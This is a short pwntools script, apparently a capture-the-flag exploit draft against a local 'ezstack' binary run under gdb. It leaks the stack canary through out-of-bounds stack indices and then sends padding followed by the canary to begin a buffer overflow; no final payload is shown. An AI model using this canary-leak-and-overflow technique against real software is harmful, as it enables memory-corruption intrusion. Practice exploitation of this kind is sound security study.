from pwn import * 
p = gdb.debug("./ezstack")

context.log_level = "debug"
def pop(num):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline(str(num).encode())
    p.recvuntil(b"\x20")
    return p.recvuntil("\n")[:-1]
def push(data):
    p.recv()
    p.sendline("1")
    p.recv()
    p.send(data)
 
canary = (b"\x00" + pop(-257))[:8]
print(canary)
print(pop(257))
print(pop(-304))
print(pop(304))
raw_input()
push(b"a"*0x100+canary)

p.interactive()
